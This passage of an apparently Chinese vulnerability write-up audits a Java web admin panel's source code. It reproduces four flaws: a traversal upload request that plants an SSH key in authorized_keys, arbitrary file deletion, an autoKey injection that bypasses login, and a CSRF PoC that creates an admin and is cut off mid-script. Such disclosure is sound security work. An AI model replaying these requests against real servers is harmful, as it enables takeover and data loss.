renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="0x04-csrf创建管理员-全版本"><a href="#0x04-csrf创建管理员-全版本" class="headerlink" title="0x04 csrf创建管理员 (全版本)"></a>0x04 csrf创建管理员 (全版本)</h2><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含的字段。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>com&#x2F;cym&#x2F;utils&#x2F;EncodePassUtils.java#encode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String pass)</span> &#123;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(pass)) &#123;<br>pass = SecureUtil.md5(pass) + SecureUtil.md5(defaultPass);<br>&#125;<br><br><span class="hljs-keyword">return</span> pass;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encodeDefaultPass</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> SecureUtil.md5(defaultPass) + SecureUtil.md5(defaultPass);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是pass生成算法。直接调用生成pass添加到Admin。</p><p>由于Admin类型我们可控，所以构建Admin类型的时候，我们传入id，name，pass，type，api即可，然后在写入数据库直接写入账号密码（默认不创建密码，且后续根据id修改密码，id不可控，是一个随机数），所以这里创建好Admin类型，进行csrf即可。</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123035053907.png" alt="image-20231123035053907"></p><p>调用算法生成123456对应pass</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56e057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>ec<span class="hljs-number">7231</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>ecd<span class="hljs-number">7</span>fa<span class="hljs-number">89</span>fd<span class="hljs-number">6</span>bae<span class="hljs-number">6e81</span>d<span class="hljs-number">2</span>adc<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>构造csrf数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span 